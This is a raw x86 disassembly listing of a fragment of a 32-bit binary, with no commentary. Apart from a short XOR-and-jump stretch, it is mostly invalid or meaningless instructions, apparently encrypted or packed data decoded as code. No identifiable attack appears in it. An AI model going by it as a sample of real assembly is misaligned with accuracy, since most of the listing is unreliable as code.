  4069cf:	and    eax,0xbd1a1d48
  4069d4:	les    ebp,FWORD PTR ds:0xa81ed3d6
  4069da:	jns    0x406986
  4069dc:	mov    ecx,0x9122eee7
  4069e1:	leave  
  4069e2:	test   BYTE PTR ds:0x7bc46f3e,al
  4069e8:	shl    BYTE PTR [eax],cl
  4069ea:	ds xchg ebp,eax
  4069ec:	sti    
  4069ed:	gs lods eax,DWORD PTR es:[esi]
  4069f0:	in     eax,0x9c
  4069f2:	mov    eax,ds:0x5819b697
  4069f7:	fisttp WORD PTR [ecx+esi*1]
  4069fa:	mov    dh,0x14
  4069fc:	sub    eax,0xedcbf2e7
  406a01:	fcom   QWORD PTR [esi]
  406a03:	jecxz  0x406a3e
  406a05:	adc    bh,BYTE PTR [esi-0x22]
  406a08:	or     eax,0x7c3930cb
  406a0d:	push   esi
  406a0e:	xor    eax,0xe2588bb8
  406a13:	push   es
  406a14:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406a15:	push   esi
  406a16:	push   edi
  406a17:	xor    edi,ecx
  406a19:	mov    edi,0xf89f2dae
  406a1e:	mov    DWORD PTR [eax],edi
  406a20:	mov    eax,DWORD PTR [ebp-0x14]
  406a23:	mov    ebx,DWORD PTR [ebp-0x8]
  406a26:	xor    DWORD PTR ds:0x434583,ebx
  406a2c:	mov    ecx,0x7510851
  406a31:	xor    eax,ecx
  406a33:	sbb    esi,DWORD PTR ds:0x4344fb
  406a39:	mov    esi,0x327299
  406a3e:	xor    ebx,ecx
  406a40:	add    DWORD PTR ds:0x43453b,0x4345f7
  406a4a:	xor    edx,edx
  406a4c:	add    eax,esi
  406a4e:	sbb    DWORD PTR ds:0x4344df,0x1c54
  406a58:	add    ebx,esi
  406a5a:	div    ebx
  406a5c:	mov    DWORD PTR ds:0x434537,edi
  406a62:	jmp    0x406e50
  406a67:	inc    ebx
  406a68:	push   ebp
  406a69:	sti    
  406a6a:	sbb    DWORD PTR [ebp-0x49aabca3],0xffffff8a
  406a71:	mov    ds:0x5f392eb,eax
  406a76:	xor    DWORD PTR [ebp+0x4f7e7ec7],ebx
  406a7c:	jns    0x406afc
  406a7e:	jle    0x406a0f
  406a80:	cld    
  406a81:	test   eax,ebx
  406a83:	cmp    ebp,ecx
  406a85:	and    DWORD PTR [ebp-0x92eaceb],esi
  406a8b:	jmp    DWORD PTR [edx+0x4a]
  406a8e:	xlat   BYTE PTR ds:[ebx]
  406a8f:	and    BYTE PTR [edx+0x22],cl
  406a92:	pop    esi
  406a93:	cmc    
  406a94:	mov    ch,0x1c
  406a96:	(bad)  
  406a97:	jae    0x406aef
  406a99:	xor    edx,eax
  406a9b:	push   esi
  406a9c:	outs   dx,BYTE PTR ds:[esi]
  406a9d:	and    edi,DWORD PTR [edi-0xc031f3f]
  406aa3:	pop    edx
  406aa4:	mov    bh,0x95
  406aa6:	loope  0x406a69
  406aa8:	inc    edi
  406aa9:	icebp  
  406aaa:	enter  0x7ef3,0x14
  406aae:	sbb    al,BYTE PTR [ecx]
  406ab0:	inc    esp
  406ab1:	cdq    
  406ab2:	out    dx,al
  406ab3:	fld    QWORD PTR [esi-0x2af6cdb8]
  406ab9:	les    eax,FWORD PTR [edi]
  406abb:	mov    bh,0x64
  406abd:	jmp    0x406ad6
  406abf:	pop    edx
  406ac0:	rcr    BYTE PTR [eax],cl
  406ac2:	mov    ecx,0xf174c550
  406ac7:	data16 div BYTE PTR [edi-0x68]
  406acb:	scas   eax,DWORD PTR es:[edi]
  406acc:	je     0x406a83
  406ace:	push   edx
  406acf:	lahf   
  406ad0:	fisubr DWORD PTR ds:0xeefcf29a
  406ad6:	jb     0x406a8a
  406ad8:	pushf  
  406ad9:	adc    DWORD PTR [edx+0x1aedc83f],edx
  406adf:	mov    eax,0xf76ee180
  406ae4:	push   esp
  406ae5:	icebp  
  406ae6:	stos   BYTE PTR es:[edi],al
  406ae7:	dec    ecx
  406ae8:	sub    ah,BYTE PTR [edi-0x57b4adb0]
  406aee:	pop    ss
  406aef:	popa   
  406af0:	scas   eax,DWORD PTR es:[edi]
  406af1:	jo     0x406af0
  406af3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406af4:	xchg   esi,eax
  406af5:	xchg   esp,eax
  406af6:	mov    eax,ds:0x4cfd8e17
  406afb:	pop    ss
  406afc:	cmp    edi,esp
  406afe:	add    bh,BYTE PTR [esi-0x29519e97]
  406b04:	mov    al,ds:0x9b6e7751
  406b09:	pusha  
  406b0a:	sbb    cl,BYTE PTR [ecx+0x2e7ad4c1]
  406b10:	mov    ebp,0x3900061
  406b15:	add    bh,cl
  406b17:	dec    esi
  406b18:	jo     0x406b6c
  406b1a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406b1b:	pop    esi
  406b1c:	enter  0xebf5,0x59
  406b20:	sbb    ch,BYTE PTR [ebx]
  406b22:	out    dx,eax
  406b23:	cdq    
  406b24:	aaa    
  406b25:	call   0xe7c0a3ab
  406b2a:	imul   eax,eax,0x258db7c8
  406b30:	sbb    al,0x2f
  406b32:	js     0x406af4
  406b34:	jg     0x406b85
  406b36:	lahf   
  406b37:	jo     0x406b1c
  406b39:	popf   
  406b3a:	sub    eax,0xba6d6e88
  406b3f:	fwait
  406b40:	call   0x8aa6:0xd8d7c33a
  406b47:	call   DWORD PTR [esi+0x37d9d8c9]
  406b4d:	in     eax,0x2e
  406b4f:	loop   0x406aed
  406b51:	push   0xffffff8f
  406b53:	clc    
  406b54:	dec    ebp
  406b55:	sub    DWORD PTR [esi-0x3869d48c],edi
  406b5b:	mov    esi,0x4b583721
  406b60:	ret    
  406b61:	push   ecx
  406b62:	jle    0x406b29
  406b64:	repz scas eax,DWORD PTR es:[edi]
  406b66:	aaa    
  406b67:	and    ebp,ebp
  406b69:	imul   edi,DWORD PTR [edx+0x19591528],0xffffff80
  406b70:	xor    BYTE PTR [ecx],dl
  406b72:	rol    ah,0xa5
  406b75:	mov    edi,0xe7ae7968
  406b7a:	push   0xffffffc1
  406b7c:	adc    eax,0x477ce89f
  406b81:	rol    eax,1
  406b83:	adc    ah,BYTE PTR [ebp+0x3]
  406b86:	mov    DWORD PTR [ebx],eax
  406b88:	leave  
  406b89:	and    DWORD PTR [ebp+0x7d],edx
  406b8c:	cdq    
  406b8d:	mov    edi,0xd625f654
  406b92:	aas    
  406b93:	ja     0x406ba7
  406b95:	pop    ds
  406b96:	shufps xmm6,XMMWORD PTR [ecx],0xc5
  406b9a:	mov    ds:0xdd8224b,eax
  406b9f:	stc    
  406ba0:	mov    dl,0xb7
  406ba2:	sti    
  406ba3:	data16 xchg BYTE PTR [esi+0x24bce3fa],dl
  406baa:	ds in  eax,0x21
  406bad:	out    0x15,eax
  406baf:	inc    ebp
  406bb0:	je     0x406b45
  406bb2:	jne    0x406c14
  406bb4:	in     eax,0xaf
  406bb6:	out    dx,eax
  406bb7:	mov    DWORD PTR [edx],esp
  406bb9:	int    0xf2
  406bbb:	fld    QWORD PTR [eax-0x1b]
  406bbe:	xchg   ecx,eax
  406bbf:	jge    0x406b7b
  406bc1:	fild   DWORD PTR [ebx+0x35]
  406bc4:	inc    esp
  406bc5:	sbb    esi,eax
  406bc7:	and    ch,bl
  406bc9:	retf   0x7bf8
  406bcc:	inc    esi
  406bcd:	jbe    0x406b60
  406bcf:	push   esp
  406bd0:	sahf   
  406bd1:	sub    dl,cl
  406bd3:	adc    BYTE PTR [edi+0x5d],bh
  406bd6:	lods   al,BYTE PTR ds:[esi]
  406bd7:	inc    ebx
  406bd8:	ret    0xd557
  406bdb:	add    DWORD PTR ds:0x3e7bc601,esi
  406be1:	xchg   ebp,eax
  406be2:	data16 jo 0x406bc9
  406be5:	or     DWORD PTR [esi],ebp
  406be7:	sbb    eax,0xd44e417c
  406bec:	ins    BYTE PTR es:[edi],dx
  406bed:	or     edi,ebp
  406bef:	ror    BYTE PTR ds:0x87e2b1da,0xda
  406bf6:	ficomp WORD PTR [ecx+0x43518e74]
  406bfc:	fdiv   QWORD PTR [edi-0x202a80de]
  406c02:	inc    ebx
  406c03:	ret    0xd7e1
  406c06:	cmp    BYTE PTR [ecx+0x580dd59],al
  406c0c:	fs add eax,0xfc1a2995
  406c12:	imul   edx,DWORD PTR [eax],0x58fa5649
  406c18:	rcr    BYTE PTR [ecx],0xd9
  406c1b:	or     eax,eax
  406c1d:	fmulp  st(5),st
  406c1f:	or     eax,0xcad51d88
  406c24:	adc    edi,0x8ca55d7d
  406c2a:	jl     0x406bce
  406c2c:	sub    DWORD PTR [edi-0x1a],edi
  406c2f:	or     ebp,ecx
  406c31:	add    edi,DWORD PTR [ecx+0x583bef3b]
  406c37:	xlat   BYTE PTR ds:[ebx]
  406c38:	mov    eax,0xa7f41754
  406c3d:	add    ebx,ecx
  406c3f:	cdq    
  406c40:	neg    DWORD PTR [esi-0x17]
  406c43:	xchg   cl,bh
  406c45:	or     DWORD PTR [edx-0x77],ebx
  406c48:	sub    DWORD PTR [ecx],ecx
  406c4a:	int3   
  406c4b:	test   BYTE PTR [ebp+0x5c],dh
  406c4e:	icebp  
  406c4f:	xchg   esi,eax
  406c50:	arpl   WORD PTR [eax+0x34d4e16],bp
  406c56:	into   
  406c57:	inc    ebx
  406c58:	(bad)  
  406c59:	loope  0x406c4e
  406c5b:	rcl    DWORD PTR [edx-0x7cf2906e],1
  406c61:	mov    al,0x2e
  406c63:	hlt    
  406c64:	scas   al,BYTE PTR es:[edi]
  406c65:	inc    ecx
  406c66:	push   cs
  406c67:	add    BYTE PTR [edi-0x1706cb6d],cl
  406c6d:	inc    ecx
  406c6e:	push   es
  406c6f:	dec    edi
  406c70:	dec    eax
  406c71:	in     eax,0x46
  406c73:	add    dh,BYTE PTR [edi-0x7025bd57]
  406c79:	outs   dx,BYTE PTR gs:[esi]
  406c7b:	xchg   edx,eax
  406c7c:	clc    
  406c7d:	push   eax
  406c7e:	and    DWORD PTR [esi+0x4e],0xde9d16f4
  406c85:	daa    
  406c86:	cmp    ebx,DWORD PTR [ebx+edx*8]
  406c89:	and    eax,0x75e8435e
  406c8e:	xchg   esp,eax
  406c8f:	and    eax,0x28860fc2
  406c94:	mov    ecx,0x18242474
  406c99:	jl     0x406c5e
  406c9b:	sti    
  406c9c:	in     al,0x6e
  406c9e:	(bad)  
  406c9f:	pop    ecx
  406ca0:	outs   dx,DWORD PTR ds:[esi]
  406ca1:	addr16 mov ebp,0xd148d825
  406ca7:	xchg   ecx,eax
  406ca8:	sub    BYTE PTR [esp+eiz*2+0x1],cl
  406cac:	push   ebx
  406cad:	jno    0x406c67
  406caf:	add    ch,dh
  406cb1:	adc    eax,0x719c1cb8
  406cb6:	shl    al,0xaa
  406cb9:	adc    eax,DWORD PTR [edi+ebp*4]
  406cbc:	fcom   DWORD PTR [esi]
  406cbe:	dec    ebp
  406cbf:	dec    ecx
  406cc0:	retf   0xa733
  406cc3:	jg     0x406ca2
  406cc5:	repnz adc ebx,0x1665845c
  406ccc:	loope  0x406c86
  406cce:	mov    bh,0xb9
  406cd0:	retf   0xdeb3
  406cd3:	mov    cl,0xd1
  406cd5:	adc    al,0x32
  406cd7:	pop    edx
  406cd8:	xchg   edx,eax
  406cd9:	aad    0x6c
  406cdb:	xor    eax,0x8daacf84
  406ce0:	add    al,0x9f
  406ce2:	pushf  
  406ce3:	add    al,0xe5
  406ce5:	inc    esi
  406ce6:	scas   al,BYTE PTR es:[edi]
  406ce7:	push   edx
  406ce8:	loopne 0x406d45
  406cea:	xchg   edi,eax
  406ceb:	cmp    edi,DWORD PTR [ebp+0x7edc6800]
  406cf1:	dec    edx
  406cf2:	inc    eax
  406cf3:	mov    dl,0x2b
  406cf5:	cmp    eax,0xc8b57421
  406cfa:	add    bh,BYTE PTR es:[esi+0x2d576439]
  406d01:	ret    
  406d02:	ret    
  406d03:	mov    ah,0xcd
  406d05:	test   eax,eax
  406d07:	repnz inc ecx
  406d09:	push   edx
  406d0a:	out    dx,eax
  406d0b:	push   eax
  406d0c:	cs aad 0x4e
  406d0f:	lds    ebx,FWORD PTR [esi+eiz*2]
  406d12:	add    DWORD PTR [edi+esi*8-0x12],edi
  406d16:	sbb    eax,DWORD PTR [ebx+0x13]
  406d19:	pop    ebp
  406d1a:	retf   
  406d1b:	and    BYTE PTR [esi],dh
  406d1d:	cmp    bh,BYTE PTR [ecx+eiz*8+0x72]
  406d21:	adc    eax,0xd9f66df8
  406d26:	dec    edi
  406d27:	lods   eax,DWORD PTR es:[esi]
  406d29:	sbb    BYTE PTR [edi+eax*2],0xfe
  406d2d:	xchg   esp,eax
  406d2f:	aam    0xa2
  406d31:	xlat   BYTE PTR ds:[ebx]
  406d32:	push   cs
  406d33:	cdq    
  406d34:	aad    0xa7
  406d36:	mov    ah,0x1
  406d38:	add    DWORD PTR [eax-0x44ee8107],0x66
  406d3f:	(bad)  
  406d40:	cmp    eax,edi
  406d42:	loope  0x406cfe
  406d44:	jmp    0xadf3345
  406d49:	mov    ds:0xbb433781,al
  406d4e:	cli    
  406d4f:	mov    ecx,0xde35d619
  406d54:	mov    al,ds:0xade895b8
  406d59:	enter  0x389f,0xc9
  406d5d:	jl     0x406dad
  406d5f:	and    ah,BYTE PTR [eax+0x7b]
  406d62:	iret   
  406d63:	xor    eax,DWORD PTR [ecx-0x23833dde]
  406d69:	not    DWORD PTR [ebx-0x37]
  406d6c:	pop    es
  406d6d:	mov    ch,0x8d
  406d6f:	test   eax,0x61720d99
  406d74:	aas    
  406d75:	cs (bad) 
  406d77:	adc    eax,0x6c99ae8
  406d7c:	xor    al,0xfe
  406d7e:	xchg   esp,eax
  406d7f:	idiv   DWORD PTR [edi]
  406d81:	xchg   esp,eax
  406d82:	loopne 0x406d9b
  406d84:	xchg   ebp,eax
  406d85:	faddp  st(7),st
  406d87:	rcr    DWORD PTR [esi+0x56f5eb8f],0x4d
  406d8e:	cmp    dh,BYTE PTR [eax-0x17]
  406d91:	pop    es
  406d92:	xchg   edi,eax
  406d93:	in     eax,dx
  406d94:	scas   al,BYTE PTR es:[edi]
  406d95:	pop    edx
  406d96:	push   DWORD PTR [ecx]
  406d98:	or     eax,DWORD PTR [ecx-0x102e0dc3]
  406d9e:	lock inc ebp
  406da0:	lods   al,BYTE PTR ds:[esi]
  406da1:	jns    0x406d23
  406da3:	mov    dh,0xc1
  406da5:	dec    ebp
  406da6:	repz mov ds:0xf7b55972,eax
  406dac:	test   BYTE PTR ds:[eax-0x1c18d9b6],al
  406db3:	mov    ah,0xb5
  406db5:	push   cs
  406db6:	ret    0xb02e
  406db9:	rcl    ecx,1
  406dbb:	pop    esi
  406dbc:	ror    ebx,1
  406dbe:	xor    edi,ebx
  406dc0:	push   edi
  406dc1:	jb     0x406e3e
  406dc3:	dec    ebx
  406dc4:	int    0xe1
  406dc6:	fst    QWORD PTR [ecx-0x577fbbe6]
  406dcc:	or     ebp,esi
  406dce:	std    
  406dcf:	sbb    al,0xd1
  406dd1:	mov    eax,ds:0x25064de2
  406dd6:	pop    ebx
  406dd7:	fs das 
  406dd9:	dec    ebx
  406dda:	pop    edx
  406ddb:	out    dx,eax
  406ddc:	mov    ah,0xf
  406dde:	jl     0x406d8a
  406de0:	mov    ecx,0xf5395738
  406de5:	jbe    0x406dc7
  406de7:	adc    al,0x73
  406de9:	cmp    DWORD PTR [esi+0x5bd19edc],ebp
  406def:	js     0x406dc9
  406df1:	or     BYTE PTR [ebp-0x3c],dl
  406df4:	inc    eax
  406df5:	xor    al,0x3b
  406df7:	push   es
  406df8:	imul   ebp,DWORD PTR [eax+0x1b],0x45
  406dfc:	and    al,0xd9
  406dfe:	jb     0x406dcc
  406e00:	inc    ecx
  406e01:	push   ecx
  406e02:	imul   edi,DWORD PTR [edx],0x89d05a48
  406e08:	in     eax,dx
  406e09:	jl     0x406db8
  406e0b:	xor    al,0x9a
  406e0d:	mov    cl,0x81
  406e0f:	mov    cl,0x7b
  406e11:	aaa    
  406e12:	cs dec esp
  406e14:	jle    0x406db8
  406e16:	sub    BYTE PTR [eax+0x63],0x5b
  406e1a:	retf   
  406e1b:	ficomp DWORD PTR [edx+eiz*1]
  406e1e:	mov    WORD PTR [esp+edi*1+0x1b],fs
  406e22:	out    0x99,eax
  406e24:	mov    ebx,ebp
  406e26:	packsswb mm6,mm6
  406e29:	mov    al,0x9c
  406e2b:	nop
  406e2c:	adc    DWORD PTR [edi-0x2d19846e],edx
  406e32:	imul   edi,DWORD PTR [ecx],0x6da7bf2a
  406e38:	das    
  406e39:	stos   BYTE PTR es:[edi],al
  406e3a:	inc    ebx
  406e3b:	push   0xffffff81
  406e3d:	pusha  
  406e3e:	lahf   
  406e3f:	test   al,0x1b
  406e41:	bound  ecx,QWORD PTR [esi+esi*2-0x3b]
  406e45:	neg    DWORD PTR ds:0x5c354758
  406e4b:	mov    edi,0xbf86814d
  406e50:	mov    edx,DWORD PTR [ebp-0x20]
  406e53:	mov    DWORD PTR ds:0x434547,0x7e00
  406e5d:	jmp    0x40724b
  406e62:	xchg   dl,dl
  406e64:	mov    bl,0x98
  406e66:	jae    0x406ec1
  406e68:	popf   
  406e69:	cld    
  406e6a:	ja     0x406e58
  406e6c:	or     dh,BYTE PTR [eax+0x58acccc8]
  406e72:	out    dx,al
  406e73:	ret    
  406e74:	jle    0x406ef4
  406e76:	dec    edi
  406e77:	jns    0x406ef7
  406e79:	jle    0x406e96
  406e7b:	or     ch,cl
  406e7d:	xor    eax,0x8705107b
  406e82:	xor    bl,0xcc
  406e85:	rcl    ebp,0xcb
  406e88:	jmp    0xc1a7:0x6ac04c5d
  406e8f:	scas   al,BYTE PTR es:[edi]
  406e90:	repnz (bad) 
  406e92:	mul    edi
  406e94:	lods   eax,DWORD PTR ds:[esi]
  406e95:	sbb    DWORD PTR [ebx],edx
  406e97:	push   es
  406e98:	pop    ebp
  406e99:	call   0x4942:0x4cc58033
  406ea0:	sbb    edx,edi
  406ea2:	call   0xfd5b:0x129f79b2
  406ea9:	jl     0x406e67
  406eab:	xor    BYTE PTR [ecx],ah
  406ead:	sbb    eax,0xc6381dca
  406eb2:	rol    esi,0xc8
  406eb5:	mov    dh,0xaf
  406eb7:	je     0x406f23
  406eb9:	jl     0x406e6c
  406ebb:	pusha  
  406ebc:	ffreep st(6)
  406ebe:	inc    edx
  406ebf:	push   ss
  406ec0:	popa   
  406ec1:	jl     0x406f2a
  406ec3:	loope  0x406ef8
  406ec5:	mov    esp,0x556c1b0c
  406eca:	popa   
  406ecb:	ds test cl,al
  406ece:	push   ebx
  406ecf:	xor    al,0xf9
  406ed1:	(bad)  
  406ed2:	jmp    0x73935a79
  406ed7:	test   eax,0x27c1d608
  406edc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406edd:	shl    DWORD PTR [si+0x3d],0x2e
  406ee2:	and    eax,DWORD PTR [ebx+0x30]
  406ee5:	int    0xc5
  406ee7:	jne    0x406eef
  406ee9:	in     eax,dx
  406eea:	pop    ebx
  406eeb:	add    al,0xaa
  406eed:	pop    es
  406eee:	pop    edi
  406eef:	cmp    edx,DWORD PTR [edx]
  406ef1:	imul   edi,DWORD PTR [ebx],0xffffffbf
  406ef4:	push   esp
  406ef5:	rol    BYTE PTR [ecx+ebp*4],0xf
  406ef9:	pop    ebp
  406efa:	pusha  
  406efb:	imul   edx,edi,0x81c5d232
  406f01:	lods   al,BYTE PTR ds:[esi]
  406f02:	or     al,0xf6
  406f04:	outs   dx,BYTE PTR ds:[esi]
  406f05:	and    edx,DWORD PTR [edx+0x60]
  406f08:	sahf   
  406f09:	jb     0x406e90
  406f0b:	xor    eax,0xc23decac
  406f10:	fisub  WORD PTR [ebp-0x44]
  406f13:	jo     0x406e96
  406f15:	push   esp
  406f16:	cli    
  406f17:	cs push 0x326f7e91
  406f1d:	mov    bh,bh
  406f1f:	jbe    0x406f4b
  406f21:	push   ebx
  406f22:	or     al,0x2b
  406f24:	sbb    eax,0x4e2be883
  406f29:	gs dec ebp
  406f2b:	(bad)  
  406f2c:	test   al,0xc3
  406f2e:	add    ah,BYTE PTR [eax-0x59381a85]
  406f34:	sub    eax,0xa0796757
  406f39:	les    ebp,FWORD PTR [esi-0x1dadb333]
  406f3f:	adc    bh,0x25
  406f42:	mov    eax,ds:0x27a0b062
  406f47:	add    eax,0x851e7d69
  406f4c:	rcr    DWORD PTR [edi-0x2f0f82ca],0x5a
  406f53:	adc    BYTE PTR [ebx-0x4],ah
  406f56:	pusha  
  406f57:	jl     0x406fb1
  406f59:	jle    0x406f3a
  406f5b:	ja     0x406fc7
  406f5d:	shl    DWORD PTR [ebx-0x6a],0x9b
  406f61:	sbb    dl,bh
  406f63:	add    DWORD PTR [edi],ebx
  406f65:	sti    
  406f66:	fnstsw WORD PTR [esi]
  406f68:	sahf   
  406f69:	sbb    dh,BYTE PTR [esi+edi*4+0x69]
  406f6d:	mov    DWORD PTR ds:0x6888aa09,ecx
  406f73:	js     0x406ff0
  406f75:	pop    eax
  406f76:	cld    
  406f77:	mov    ds:0xe12034ed,al
  406f7c:	inc    eax
  406f7d:	push   0xffffffe7
  406f7f:	cmp    BYTE PTR [eax-0x2b],bh
  406f82:	out    0x2e,eax
  406f84:	jp     0x406f91
  406f86:	jno    0x406fb4
  406f88:	add    BYTE PTR [ecx],0x15
  406f8b:	push   eax
  406f8c:	das    
  406f8d:	or     BYTE PTR [ebx+0x64efac07],dh
  406f93:	push   ebx
  406f94:	jp     0x406f82
  406f96:	fnstcw WORD PTR [ebx-0x12]
  406f99:	pusha  
  406f9a:	pop    ds
  406f9b:	rol    DWORD PTR [ebp-0x6a22e8cc],cl
  406fa1:	sti    
  406fa2:	pusha  
  406fa3:	lock out 0x68,al
  406fa6:	add    ah,bh
  406fa8:	or     DWORD PTR [ebp+0x67],edx
  406fab:	jmp    0x49892932
  406fb0:	lock add bh,BYTE PTR [ecx+0x4396d85d]
  406fb7:	inc    esi
  406fb8:	push   0x8
  406fba:	les    edi,FWORD PTR [edi+0x6d]
  406fbd:	jge    0x406f75
  406fbf:	xchg   ecx,eax
  406fc0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406fc1:	ror    DWORD PTR [esi],0x76
  406fc4:	push   esi
  406fc5:	imul   edi,DWORD PTR [edi+ebx*2],0xffffffea
  406fc9:	jg     0x406fa5
  406fcb:	std    
  406fcc:	daa    
  406fcd:	or     al,0xdd
  406fcf:	adc    bl,BYTE PTR [esi+ebx*2]
  406fd2:	dec    esp
  406fd3:	mov    ebx,0xb61c5f85
  406fd8:	pop    esi
  406fd9:	retf   
  406fda:	ss test eax,0xe7a21eab
  406fe0:	fldcw  WORD PTR [edi+0x3f]
  406fe3:	fdiv   st,st(4)
  406fe5:	cmp    BYTE PTR [ebp-0x6352424c],ah
  406feb:	jp     0x406fb3
  406fed:	pushf  
  406fee:	out    dx,al
  406fef:	retf   0xe168
  406ff2:	mov    cl,0x47
  406ff4:	test   al,0x82
  406ff6:	cmp    eax,0x9344eb1
  406ffb:	sub    ebx,DWORD PTR [eax+0x1ddf4da0]
  407001:	sub    ebp,DWORD PTR [ebx+ebx*2-0x7b]
  407005:	(bad)  
  407006:	xchg   ebx,eax
  407007:	lds    esi,FWORD PTR [ecx]
  407009:	sbb    BYTE PTR [edi],bh
  40700b:	push   0x38a75aeb
  407010:	xor    ebp,DWORD PTR [eax]
  407012:	or     BYTE PTR [edi-0x64],al
  407015:	out    dx,eax
  407016:	mov    dh,0x76
  407018:	jae    0x406f9a
  40701a:	jno    0x406fe7
  40701c:	nop
  40701d:	pop    ebp
  40701e:	jae    0x406fee
  407020:	mov    bl,0x2b
  407022:	jae    0x407010
  407024:	lds    esi,FWORD PTR [edi-0x2a]
  407027:	rcr    BYTE PTR [edx+0x5134f3f4],1
  40702d:	mov    ebp,es
  40702f:	out    dx,eax
  407030:	cmp    eax,0x9b39c5d5
  407035:	(bad)
  407039:	push   esp
  40703a:	and    al,0xdb
  40703c:	(bad)  
  40703d:	sub    BYTE PTR [edx+0xc],dl
  407040:	or     dh,dh
  407042:	mov    ds:0xc74d7e02,al
  407047:	inc    BYTE PTR [edi]
  407049:	push   0x1ce30e0
  40704e:	shl    eax,cl
  407050:	(bad)  
  407051:	hlt    
  407052:	xchg   esp,eax
  407053:	imul   BYTE PTR [ecx+0x70]
  407056:	cmp    edi,DWORD PTR [ebp-0x44]
  407059:	inc    esi
  40705a:	sbb    ebp,ebx
  40705c:	sar    edx,cl
  40705e:	sub    esi,DWORD PTR [edx]
  407060:	lea    ecx,[esi-0x58d3c78b]
  407066:	or     dh,BYTE PTR ds:0xf4a306ca
  40706c:	mov    esi,0x3574da8c
  407071:	aam    0x63
  407073:	call   0xf72decd9
  407078:	adc    eax,0xba449e7f
  40707d:	xchg   esp,eax
  40707e:	sbb    DWORD PTR [ebx+0x5],esi
  407081:	sar    DWORD PTR [esi-0x7],cl
  407084:	dec    ebp
  407085:	pop    esp
  407086:	lods   al,BYTE PTR ds:[esi]
  407087:	ror    BYTE PTR [ebx+0x6c],1
  40708a:	sub    ebp,DWORD PTR [ecx+0x4e]
  40708d:	retf   
  40708e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40708f:	jle    0x407054
  407091:	cld    
  407092:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407093:	push   ds
  407094:	(bad)  
  407095:	in     eax,dx
  407096:	push   cs
  407097:	in     eax,dx
  407098:	repz mov ah,0x6b
  40709b:	rol    DWORD PTR [edi+0x793c2860],1
  4070a1:	dec    edi
  4070a2:	cwde   
  4070a3:	xor    BYTE PTR [esi],ah
  4070a5:	and    ah,BYTE PTR [edx+0x24]
  4070a8:	adc    ebx,esp
  4070aa:	and    cl,al
  4070ac:	dec    eax
  4070ad:	or     eax,0x10dbb104
  4070b2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4070b3:	pusha  
  4070b4:	adc    al,0x47
  4070b6:	mov    ch,0x7
  4070b8:	cmp    ecx,ebp
  4070ba:	sar    DWORD PTR [edi-0x6],1
  4070bd:	jp     0x40708b
  4070bf:	xor    eax,esi
  4070c1:	mov    eax,ds:0xf8f426c6
  4070c6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4070c7:	adc    al,0xa
  4070c9:	dec    esp
  4070ca:	jmp    0x6e25:0x4ec4ee07
  4070d1:	ins    BYTE PTR es:[edi],dx
  4070d2:	or     BYTE PTR [ebp-0x54a9f673],bl
  4070d8:	lahf   
  4070d9:	gs push ebx
  4070db:	aas    
  4070dc:	inc    DWORD PTR [ebx]
  4070de:	dec    esi
  4070df:	sbb    edi,eax
  4070e1:	inc    ebp
  4070e2:	fstp   TBYTE PTR [ecx+esi*4+0x24b277c0]
  4070e9:	fs icebp 
  4070eb:	jmp    0xd38d:0xcdd01e1
  4070f2:	fldenv [edx]
  4070f4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4070f5:	xchg   edi,eax
  4070f6:	push   eax
  4070f7:	ja     0x407102
  4070f9:	scas   al,BYTE PTR es:[edi]
  4070fa:	(bad)  
  4070fb:	ins    DWORD PTR es:[edi],dx
  4070fc:	pop    edx
  4070fd:	into   
  4070fe:	iret   
  4070ff:	xchg   BYTE PTR [esi+0x5],ch
  407102:	dec    ebp
  407103:	or     cl,ah
  407105:	and    BYTE PTR [edi],ch
  407107:	dec    ebp
  407108:	(bad)  
  407109:	fisttp QWORD PTR [edx-0x5b0d3101]
  40710f:	add    al,0xff
  407111:	(bad)  
  407113:	arpl   WORD PTR [ecx],bp
  407115:	lods   eax,DWORD PTR ds:[esi]
  407116:	jmp    FWORD PTR [edi+eiz*8-0x32d8f59d]
  40711d:	mov    esp,0x8cfc1a84
  407122:	cmc    
  407123:	add    al,0xbb
  407125:	xor    ebp,DWORD PTR [eax+0x1f]
  407128:	push   edx
  407129:	sub    al,0x38
  40712b:	ins    BYTE PTR es:[edi],dx
  40712c:	int3   
  40712d:	int    0xcb
  40712f:	rcl    BYTE PTR [esi+0x47fb53d9],1
  407135:	ret    
  407136:	aam    0xb5
  407138:	jmp    0x407162
  40713a:	bound  eax,QWORD PTR [ebp-0x7b]
  40713d:	xchg   esp,eax
  40713e:	sbb    DWORD PTR [eax-0x11],eax
  407141:	push   ebp
  407142:	dec    ebp
  407143:	mov    bl,BYTE PTR ds:0xb6e58890
  407149:	dec    edi
  40714a:	xor    al,0x32
  40714c:	clc    
  40714d:	sbb    al,0xe6
  40714f:	fwait
  407150:	xor    eax,0xa8dff55d
  407155:	retf   
  407156:	and    BYTE PTR cs:[esi+0x6b],dl
  40715a:	ja     0x407140
  40715c:	push   eax
  40715d:	xchg   esp,ecx
  40715f:	repnz mov ebx,0x39d576d9
  407165:	add    eax,DWORD PTR [ebx+0xa467967]
  40716b:	mov    al,0x6c
  40716d:	jne    0x407173
  40716f:	xor    DWORD PTR [eax-0x79],0xffffffaa
  407173:	cmp    eax,0x7f5459fb
  407178:	mov    al,0x7
  40717a:	arpl   WORD PTR [ebp+0x7f9ec61],cx
  407180:	ffree  st(6)
  407182:	or     cl,BYTE PTR [ecx]
  407184:	sbb    DWORD PTR [ecx+0x6484cdfb],eax
  40718a:	ss pop ebx
  40718c:	out    dx,eax
  40718d:	in     al,0x5c
  40718f:	enter  0xda09,0xa0
  407193:	imul   edi,DWORD PTR [ebp-0x361691c6],0x1f3fd8ef
  40719d:	or     dh,BYTE PTR [esi+0x2ba1ddbd]
  4071a3:	push   0xf777c9a3
  4071a8:	retf   0x7d68
  4071ab:	jo     0x4071f3
  4071ad:	test   al,0xf3
  4071af:	data16 lahf 
  4071b1:	fwait
  4071b2:	mov    ah,0x25
  4071b4:	fisub  DWORD PTR [esi+ebx*4]
